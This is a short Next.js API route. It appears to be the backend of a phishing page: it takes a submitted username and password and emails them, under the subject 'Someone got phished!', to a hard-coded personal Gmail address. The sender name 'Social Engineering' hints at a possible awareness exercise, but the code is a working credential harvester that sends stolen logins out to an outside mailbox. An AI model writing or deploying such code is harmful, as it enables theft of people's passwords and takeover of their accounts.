import { EmailTemplate } from "../../components/Email";
import { NextResponse } from "next/server";
import { Resend } from "resend";

const resend = new Resend(process.env.RESEND_API_KEY);

export async function POST(request) {
  try {
    const body = await request.json();
    const { username, password } = body;
    const data = await resend.emails.send({
      from: "Social Engineering <onboarding@resend.dev>",
      to: "kinekai.holthe@gmail.com",
      subject: "Someone got phished!",
      react: EmailTemplate({ username: username, password: password }),
    });

    return NextResponse.json(data);
  } catch (error) {
    return NextResponse.json({ error });
  }
}
